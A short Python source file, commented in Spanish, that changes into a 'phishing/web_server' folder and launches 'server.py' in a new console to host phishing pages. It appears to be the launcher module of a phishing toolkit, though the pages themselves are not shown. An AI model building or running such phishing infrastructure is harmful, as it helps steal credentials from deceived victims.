import os
import subprocess


def get_path():

    path = os.getcwd() + "\\phishing\\web_server"
    print(path)
    return path


def run_server(path_to_run_server):

    # Con Popen() evitamos que el flujo del programa se
    # detenga esperando al script del servidor, y con
    # subprocess.CREATE_NEW_CONSOLE abrimos el script en
    # otra consola
    if subprocess.Popen(
                  path_to_run_server,
                  creationflags=subprocess.CREATE_NEW_CONSOLE
                  ):
        print('Server process start')
    else:
        print("Can't start server process")

    return


def start():

    os.system('cls')

    # Almacenamos la ruta original desde
    # donde se ejecuta el código
    original_path = os.getcwd()

    # Nos movemos al path donde están las páginas phishing,
    # ya que cuando se inicia el servidor él escoge como root
    # el directorio actual
    os.chdir(get_path())

    print('Staring server...')

    # Ruta para abrir el script donde se ejecutará el servidor,
    # colocamos Python antes para que abra el script con python.
    # Como cambiamos de directorio de ejecución, solo es necesario
    # colocar el nombre del archivo, ya que estamos en su directorio
    path_to_run_server = 'Python server.py'
    run_server(path_to_run_server)

    # Una vez que iniciamos el servidor en la ruta web_server,
    # volvemos a la ruta original desde donde se ejecuta el código
    os.chdir(original_path)

    os.system('pause')
    return
